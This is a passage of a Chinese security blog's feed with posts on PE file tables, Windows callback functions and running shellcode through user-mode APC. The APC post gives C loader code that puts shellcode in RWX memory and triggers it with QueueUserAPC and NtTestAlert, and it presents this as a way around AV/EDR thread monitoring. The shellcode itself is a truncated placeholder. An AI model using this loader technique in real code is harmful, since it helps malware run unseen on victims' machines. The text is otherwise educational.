4字节</span><br><span class="line">        Ordinal    4字节</span><br><span class="line">        AddressOfData    4字节</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">IMAGE_IMPORT_BY_NAME &#123;</span><br><span class="line">    ...</span><br><span class="line">    Name1    1字节    // 导入函数名称字符串</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序要使用的函数及相关信息，存储在导入表中</p><p>导入表地址可以从IMAGE_NT_HEADERS中的IMAGE_OPTIONAL_HEADER32中的IMAGE_DATA_DIRECTORY中的索引为5的结构体中的VirtualAddress和isize获取地址偏移和大小，一个DLL对应一个IMAGE_IMPORT_DESCRIPTOR，也就是说有多少个DLL就有多少个IMAGE_IMPORT_DESCRIPTOR，最后以一个值全为0的IMAGE_IMPORT_DESCRIPTOR结构结束，同样，包含IMAGE_THUNK_DATA的数组也是，一个IMAGE_THUNK_DATA对应一个导入函数，最后以一个值全为0的IMAGE_THUNK_DAT结构结束，IMAGE_THUNK_DATA本质上是一个4字节，当最高位为1时，表示函数以序号方式导入，这时4字节的低位就是函数的序号，当最高位为0时，表示函数以名称方式导入，这时4字节的值是一个RVA，指向IMAGE_IMPORT_BY_NAME，IMAGE_IMPORT_BY_NAME中的Name1包含导入函数的名称</p><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_EXPORT_DIRECTORY &#123;</span><br><span class="line">    ...</span><br><span class="line">    nName    4字节    // 指向包含文件名字符串的RVA，即使更改了DLL的文件名为Ker.dll，也能从这个字段中获取编译时的DLL文件名Kernel32.dll</span><br><span class="line">    nBase    4字节    // 导出函数的起始序号</span><br><span class="line">    NumberOfFunctions    4字节    // 导出函数的总个数</span><br><span class="line">    NumberOfNames    4字节    // 有名称的导出函数总个数</span><br><span class="line">    AddressOfFunctions    4字节    // 指向包含导出函数地址数组的RVA</span><br><span class="line">    AddressOfNames    4字节    // 指向包含导出函数名称数组的RVA</span><br><span class="line">    AddressOfNameOrdinals    4字节    // 指向包含函数名称序号数组的RVA</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和导入表相对应，存储要给别的程序使用的函数</p><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_BASE_RELOCATION &#123;</span><br><span class="line">    VirtualAddress    4字节    // 包含要重定位的内存页的起始RVA</span><br><span class="line">    SizeOfBlock       4字节    // 重定位块的长度</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有意外的情况下，程序的建议装载地址就是实际装载地址，但是对于EXE文件，如果启用了ASLR（地址空间布局随机化），则实际装载地址会不同，对于DLL文件，如果建议装载地址已经被其他DLL占用了，则实际装载地址会不同，所以需要对代码进行重定位</p><p> 直接寻址指令的地址 + (实际装载地址 - 建议装载地址)，实际装载地址由Windows装载器提供不用我们操心，建议装载地址存储在PE文件的IMAGE_OPTIONAL_HEADER32中的ImageBase中，所以重定位表中只需要存储要修改的直接寻址指令的地址</p><p>重定位表由一系列重定位块组成，一个重定位块对应一个内存页，用来描述这个内存页中需要重定位的项，每个重定位块以一个IMAGE_BASE_RELOCATION开头，后面跟着一系列重定位项，每个重定位项占2个字节，SizeOfBlock = 4 + 4 + 2*重定位项数，所以重定位项数 = (SizeOfBlock - 8) / 2，每个重定位项占用2个字节共16位，VirtualAddress + 16位中的低12位就是要重定位指令的最终RVA，16位中的高4位用来表示属性，所有重定位块最终以一个VirtualAddress字段为0的IMAGE_BASE_RELOCATION结构结束。还有一个问题可以借此解答，假如PE的装载地址是0x00400000，代码的起始地址如果和装载地址一样的话，那第一页的重定位块的IMAGE_BASE_RELOCATION结构中的VirtualAddress的RVA就为0x00400000 - 0x00400000 = 0，此时 系统就会认为当前的重定位块结束了，导致重定位失败</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;想开发反病毒引擎，第一步总是对PE文件进行解析，虽然有点落伍，但这是基础，想开发病毒也同理，很多的病毒样本在使用Indirect Sysca</summary>
      
    
    
    
    <category term="汇编语言" scheme="http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
  </entry>
  
  <entry>
    <title>通过APC执行Shellcode</title>
    <link href="http://example.com/2025/09/26/%E9%80%9A%E8%BF%87APC%E6%89%A7%E8%A1%8CShellcode/"/>
    <id>http://example.com/2025/09/26/%E9%80%9A%E8%BF%87APC%E6%89%A7%E8%A1%8CShellcode/</id>
    <published>2025-09-26T02:50:20.000Z</published>
    <updated>2025-10-09T14:22:13.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇博客主要介绍APC是什么、APC函数何时被执行，不会包含太多深层次的分析，主要是介绍APC如何被用来执行shellcode</p><h1 id="APC介绍"><a href="#APC介绍" class="headerlink" title="APC介绍"></a>APC介绍</h1><p>APC，全称Asynchronous Procedure Calls，译为异步过程调用，在Windows下是一种机制（我猜测在其他操作系统下也是类似的机制），允许异步执行函数，所谓的异步执行，指的是当前线程执行过程中，有一个异步执行任务，当前线程无需等待这个异步执行任务，可以继续执行，相对应的，同步执行，指的是当前线程执行过程中，有一个同步执行任务，当前线程需要等待这个同步执行任务，无法继续执行，同步执行的结果当场就返回了，异步执行的结果是通过一个回调机制返回</p><p>Windows中关于APC的一个重要特点是，只有线程处于警报状态时，线程APC队列中的APC函数才会执行，通过调用SleepEx()、WaitForSingleObjectEx()、SignalObjectAndWaitEx()、SignalObjectAndWait()、WaitForMultipleObjectsEx()可以让线程处于警报状态</p><p>Windows中的APC包含多种类型，也分为用户模式和内核模式，本文中我们只关注用户模式下的QueueUserAPC</p><h1 id="APC执行Shellcode"><a href="#APC执行Shellcode" class="headerlink" title="APC执行Shellcode"></a>APC执行Shellcode</h1><p>为什么APC可以用于shellcode执行或远程进程注入，可以使用QueueUserAPC执行shellcode，而无需使用CreateThread/CreateThreadEx创建线程，或使用QueueUserAPC注入到远程线程，而无需使用CreateRemoteThread/CreateRemoteThreadEx创建远程线程，尤其是CreateRemoteThread/CreateRemoteThreadEx会被AV/EDR严格监控，通过用户模式Hook或者注册内核回调（PsProcessNotifyRoutine/PsThreadNotifyRoutine）</p><p>当使用用户模式APC执行shellcode，不管是本地线程还是远程线程，总是会创建一个新的用户模式APC队列，你可以想象APC是排队取餐的顾客，遵循先进先出的原则，接下来我们通过WaitForSingleObjectEx()让线程处于警报状态，以此触发当前APC队列中APC函数的执行，下列C语言实现的代码片段，展示了用户模式APC注入，没有规避RWX内存特征、没有进行shellcode加密，只是一个demo展示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 定义shellcode</span><br><span class="line">    unsigned char shellcode[] = &quot;\xfc\x48\x83...&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 申请内存</span><br><span class="line">    PVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 拷贝shellcode到申请的内存</span><br><span class="line">    memcpy(addr, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 为当前线程创建一个新的用户模式APC队列，队列中有一个函数</span><br><span class="line">    // 第一个参数为要执行的函数，指向申请内存的指针被强制转换为函数指针类型</span><br><span class="line">    // 第二个参数是线程句柄，通过GetCurrentThread()获取当前线程的伪句柄</span><br><span class="line">    // 第三个参数是要执行函数的参数，当前执行的函数无需参数，所以为NULL</span><br><span class="line">    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 这个函数使当前线程进入警报的wait状态</span><br><span class="line">    // INFINITE表示这个wait是无期限的，也就是不会超时，线程会等候直到APC函数被执行或者其它形式的唤醒被触发</span><br><span class="line">    // TRUE参数表示这个wait是警报状态的，那会触发APC队列中的函数执行</span><br><span class="line">    WaitForSingleObjectEx(GetCurrentThread(), INFINITE, TRUE);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="NtTestAlert"><a href="#NtTestAlert" class="headerlink" title="NtTestAlert"></a>NtTestAlert</h1><p>正如代码注释中提到的，第一步是通过QueueUserAPC创建一个新的用户模式APC队列，然后通过WaitForSingleObjectEx让线程处于警报状态，进而触发APC函数的执行，上述方案中，可以替换的部分是WaitForSingleObjectEx，可以通过NtTestAlert强制APC队列中的函数执行，无需让线程处于警报状态</p><p>换句话说，NtTestAlert的主要作用就是检查APC队列中是否有函数未被执行，如果有的话将执行它们，如果在调用NtTestAlert之前APC队列为空，则该函数将简单地返回，不产生任何影响，它的这个特点对于执行线程APC队列中的函数很有用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// NtTestAlert是Windows中的Native API，无法直接拿来用，需要先声明函数原型，动态获取后通过函数指针调用</span><br><span class="line">typedef NTSTATUS(NTAPI* PFN_NTTESTALERT)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    // 定义shellcode</span><br><span class="line">    unsigned char shellcode[] = &quot;\xfc\x48\x83...&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 获取ntdll的模块句柄</span><br><span class="line">    HMODULE hNtdll = GetModuleHandleA(&quot;ntdll&quot;);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 获取NtTestAlert的指针，并强制转换为上面声明的函数原型的类型</span><br><span class="line">    PFN_NTTESTALERT NtTestAlert = (PFN_NTTESTALERT)GetProcAddress(hNtdll, &quot;NtTestAlert&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 申请内存</span><br><span class="line">    PVOID addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 拷贝shellcode到申请的内存</span><br><span class="line">    memcpy(addr, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 为当前线程创建一个新的用户模式APC队列，队列中有一个函数</span><br><span class="line">    // 第一个参数为要执行的函数，指向申请内存的指针被强制转换为函数指针类型</span><br><span class="line">    // 第二个参数是线程句柄，通过GetCurrentThread()获取当前线程的伪句柄</span><br><span class="line">    // 第三个参数是要执行函数的参数，当前执行的函数无需参数，所以为NULL</span><br><span class="line">    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 通过NtTestAlert执行APC队列中的函数</span><br><span class="line">    NtTestAlert();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文已经讲解了APC如何被用来执行shellcode，这使攻击者可以用来绕过监控CreateThread()/CreateThreadEx()或CreateRemoteThread/CreateRemoteThreadEx的AV/EDR，虽然本文只是演示APC在本地进程的用法，我相信APC在远程进程注入中会更有用</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本篇博客主要介绍APC是什么、APC函数何时被执行，不会包含太多深层次的分析，主要是介绍APC如何被用来执行shellcode&lt;/p&gt;
&lt;h</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
  </entry>
  
  <entry>
    <title>回调函数</title>
    <link href="http://example.com/2025/09/18/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2025/09/18/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/</id>
    <published>2025-09-18T02:13:14.000Z</published>
    <updated>2025-10-09T14:17:09.104Z</updated>
    
    <content type="html"><![CDATA[<p>恶意的Loader和PIS（Position-Independent Shellcode）会使用各种技术来绕过AV/EDR和安全人员的分析，其中代码执行这个环节经常会通过“回调函数”的方式来隐蔽的执行。回调的本质是将函数A的地址传给函数B，在函数B执行的过程中，触发某个条件后，停下来执行函数A</p><p>回调分为异步的和同步的</p><p>异步的回调例如，鼠标移动时，对应的Hook被触发，Hook处理的同时，鼠标继续移动</p><p>同步的回调例如，函数A要读取数据B，触发某个条件后，函数C修改数据B，然后函数A继续读取数据B</p><p>下面是一个回调函数的示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">// 声明窗口过程回调函数，用于处理窗口消息</span><br><span class="line">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);</span><br><span class="line"></span><br><span class="line">int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123;</span><br><span class="line">    // 注册窗口类</span><br><span class="line">    // 定义并初始化一个常量、宽字符数组</span><br><span class="line">    const wchar_t CLASS_NAME[] = L&quot;Sample Window Class&quot;;</span><br><span class="line"></span><br><span class="line">    // 向操作系统注册一种名为CLASS_NAME的新窗口类型，这种类型的窗口属于当前应用程序实例hInstance，并且所有发送给这类窗口的消息都由WindowProc函数来处理</span><br><span class="line">    WNDCLASS wc = &#123; &#125;;</span><br><span class="line">    wc.lpfnWndProc = WindowProc;  // 设置回调函数</span><br><span class="line">    wc.hInstance = hInstance;</span><br><span class="line">    wc.lpszClassName = CLASS_NAME;</span><br><span class="line">    RegisterClass(&amp;wc);</span><br><span class="line">    </span><br><span class="line">    // 创建窗口</span><br><span class="line">    HWND hwnd = CreateWindowEx(</span><br><span class="line">        0,                                        // 扩展窗口样式</span><br><span class="line">        CLASS_NAME,                               // 窗口类</span><br><span class="line">        L&quot;回调函数示例&quot;,                            // 窗口标题</span><br><span class="line">        WS_OVERLAPPEDWINDOW,                      // 窗口样式</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300,   // 位置和大小</span><br><span class="line">        NULL,                                     // 父窗口</span><br><span class="line">        NULL,                                     // 菜单</span><br><span class="line">        hInstance,                                // 实例句柄</span><br><span class="line">        NULL                                      // 附加数据</span><br><span class="line">    );</span><br><span class="line">    if (hwnd == NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 显示窗口</span><br><span class="line">    ShowWindow(hwnd, nCmdShow);</span><br><span class="line">    </span><br><span class="line">    // 消息循环</span><br><span class="line">    MSG msg = &#123; &#125;;</span><br><span class="line">    while (GetMessage(&amp;msg, NULL, 0, 0))</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 窗口过程回调函数实现</span><br><span class="line">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) &#123;</span><br><span class="line">    switch (uMsg)</span><br><span class="line">    &#123;</span><br><span class="line">        case WM_DESTROY:</span><br><span class="line">            PostQuitMessage(0);</span><br><span class="line">            return 0;</span><br><span class="line">        </span><br><span class="line">        case WM_PAINT:</span><br><span class="line">        &#123;</span><br><span class="line">            PAINTSTRUCT ps;</span><br><span class="line">            HDC hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">            </span><br><span class="line">            // 在窗口上绘制文本</span><br><span class="line">            TextOut(hdc, 50, 50, L&quot;这是一个回调函数示例&quot;, 9);</span><br><span class="line">            </span><br><span class="line">            EndPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case WM_LBUTTONDOWN:</span><br><span class="line">            MessageBox(hwnd, L&quot;您点击了鼠标左键!&quot;, L&quot;提示&quot;, MB_OK);   // 鼠标左键点击时显示消息框</span><br><span class="line">            return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return DefWindowProc(hwnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码编译执行后，如下图<br><img src="/2025/09/18/%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/01.png" alt="image"><br>注释中已经讲的很清楚了，再补充两句，Windows开发中好多东西看着眼花缭乱，其实就是typedef定义的别名，比如这条语句中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);</span><br></pre></td></tr></table></figure><p>CALLBACK就是__stdcall的别名，LRESULT是LONG_PTR的别名，而LONG_PTR会根据是64位还是32位，选择是__int64还是long，原型如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">typedef LONG_PTR LRESULT;</span><br><span class="line"></span><br><span class="line">#if defined(_WIN64)</span><br><span class="line">    typedef __int64 LONG_PTR;</span><br><span class="line">#else</span><br><span class="line">    typedef long LONG_PTR;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">long：C/C++中基本的数据类型，有个需要注意的地方是，Windows下不管32位还是64位，long都是4字节有符号整数，但在Unix下long是8字节有符号整数</span><br><span class="line"></span><br><span class="line">__int64：微软编译器（MSVC）特有的数据类型，8字节有符号整数</span><br><span class="line"></span><br><span class="line">typedef unsigned int UINT;</span><br><span class="line"></span><br><span class="line">// 在64位系统上 (_WIN64 defined)</span><br><span class="line">typedef UINT_PTR WPARAM; // UINT_PTR 是64位无符号整型</span><br><span class="line">typedef LONG_PTR LPARAM; // LONG_PTR 是64位有符号整型</span><br><span class="line"></span><br><span class="line">// 在32位系统上</span><br><span class="line">typedef UINT WPARAM;     // UINT 是32位无符号整型</span><br><span class="line">typedef LONG LPARAM;     // LONG 是32位有符号整型</span><br><span class="line"></span><br><span class="line">#define WINAPI __stdcall</span><br><span class="line"></span><br><span class="line">HWND：窗口句柄，可以理解为指向窗口这个对象的类型</span><br><span class="line"></span><br><span class="line">HINSTANCE：应用程序实例句柄，一个应用程序在内存中可以有多个实例（进程），每个实例（进程）都是独一无二的，可以理解为指向这个应用程序实例对象的类型</span><br><span class="line"></span><br><span class="line">HMODULE：模块句柄，和HINSTANCE等价</span><br></pre></td></tr></table></figure><p>每次有新的回调函数被发现，都会给安全分析人员带来挑战，因此恶意软件开发者经常研究新的回调函数，下面将尝试列出全部的回调函数（准确的说是微软和第三方网站记录的），有助于AV/EDR重点监控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span 